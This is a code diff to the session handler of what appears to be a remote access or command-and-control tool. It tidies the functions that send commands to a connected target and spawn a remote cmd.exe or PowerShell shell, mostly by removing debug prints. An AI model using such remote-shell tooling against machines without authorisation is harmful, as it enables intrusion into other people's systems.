@@ -16,6 +16,8 @@ from .spawnshell import FakeCmd
 from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SPLIT
 
 import threading
+import readline
+
 
 class Session:
     #This class is called when the target is selected.
@@ -41,24 +43,35 @@ class Session:
 
 -b or --back : Back to menu.
 """) 
+
     def executeCommand(self,cmd_list):
         '''-c'''
-        print("-->",cmd_list)
+       # print("-->",cmd_list)
         cmd_list.pop(0) #delete "-c"
         
-        cmd = "".join(cmd_list) #list to string
-        cmd.replace("\"", "") #remove " ' "
-        print("--->", cmd)
+        tmp_cmd = " ".join(cmd_list) #list to string
+        cmd = ""
+
+        for char in tmp_cmd: #remove " 
+            if(char == "\""):
+                #print("char detect: ",char)
+                pass
+            elif(char == " "): #if space
+               # print("space")
+                cmd += " "
+            else:
+                cmd += char
 
         if(CheckConn().sendsafe(self.session_nb, self.socket, cmd.encode())): #send data
-            printColor("successfully",CheckConn().recvall(self.socket,4096).decode("utf8","replace"))
+            printColor("successfully",CheckConn().recvcommand(self.socket,4096).decode("utf8","replace"))
         else:
             printColor("error","\n[-] An error occurred while sending the command.\n")
         
     def spawnShell(self,prog):
         '''--command or --powershell'''
+
         #Ouvre un shell sur la machine distante.
-        printColor("help","\n\n[?] Execute -b or --back to return to sessions mode.") 
+        printColor("help","\n[?] Execute -b or --back to return to sessions mode.\n") 
         #printColor("help","\r[?] Mod shell active, You can run windows commands.\n\n")
         
         if(CheckConn().sendsafe(self.session_nb, self.socket, ("MOD_SPAWN_SHELL:"+prog).encode() ) ):
@@ -108,7 +121,6 @@ class Session:
                         self.spawnShell("powershell.exe")
                     
                     elif terminal[i] == "-c":
-                        print(i)
                         self.executeCommand(terminal)
 
                     elif terminal[i] == "-b" or terminal[i] == "--back":
@@ -120,15 +132,9 @@ class Session:
                         pass
                         print(i)
                 except IndexError:
-                    print("CHHHED")
-                    print(i)
-                else:
-                    print("dsdsdsdssd")
-        
+                    pass
+                    #print("CHHHED")
+                    #print(i)
+                
         printColor("information","[-] The session was cut, back to menu.") #If the session close.
         printColor("information","[-] Back to the server menu.\n")
-
-        #for key in Handler.dict_conn.keys():
-            #print("Session ",key," ",Handler.dict_conn[key][1]+":"+str(Handler.dict_conn[key][2]))
-        #print("\n")
-#0.5 mo
